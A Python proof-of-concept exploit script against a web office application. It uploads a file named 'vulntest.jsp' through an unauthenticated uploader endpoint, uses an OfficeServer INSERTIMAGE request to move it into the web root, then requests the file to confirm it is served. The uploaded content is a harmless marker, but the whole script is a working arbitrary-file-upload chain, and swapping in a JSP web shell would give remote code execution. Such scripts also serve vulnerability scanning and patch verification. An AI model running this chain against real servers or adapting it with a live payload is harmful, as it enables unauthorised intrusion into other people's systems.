import re
import sys
import requests
import warnings
warnings.filterwarnings("ignore")

def upload_file(site):
   result = {}
   headers = {
       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0'
   }
   filec = "VulnTest"
   path = '/workrelate/plan/util/uploaderOperate.jsp'
   files = {'secId': (None,"1"),
       'Filedata': ("vulntest.jsp",filec),
       'plandetailid': (None,"1")
       }
   vulur = site+path
   base_resp = requests.post(vulur, headers = headers, verify = False, allow_redirects = False, timeout = 10, files = files)
   #print(base_resp.status_code, base_resp.text)
   if  base_resp.status_code == 200 and "vulntest.jsp" in base_resp.text and 'btn_wh' in base_resp.text:
       fileid = re.findall(r'''href='/workrelate/plan/util/ViewDoc\.jsp\?id=\d+?&plandetailid=1&fileid=(.*?)'>''',base_resp.text)[0]
       print("[+]Get fileid:", fileid)
       path = '/OfficeServer'
       files = {'aaa': (None,"{'OPTION':'INSERTIMAGE','isInsertImageNew':'1','imagefileid4pic':'"+fileid+"'}")}
       vulur2 = site+path
       base_resp2 = requests.post(vulur2, headers = headers, verify = False, allow_redirects = False, timeout = 10, files = files)
       #print(base_resp2.status_code, base_resp2.text)
       if  base_resp2.status_code == 200 and filec in base_resp2.text:
           tpath = "/vulntest.jsp"
           vulur1 = site+tpath
           base_resp1 = requests.get(vulur1, headers = headers, verify = False, allow_redirects = False, timeout = 10)
           if base_resp1.status_code == 200 and 'VulnTest' in base_resp1.text:
               print("[+]Vuln exists, file path: ", vulur1)
               print("[+]File Content: ", base_resp1.text)


if __name__=="__main__":
    upload_file(sys.argv[1])
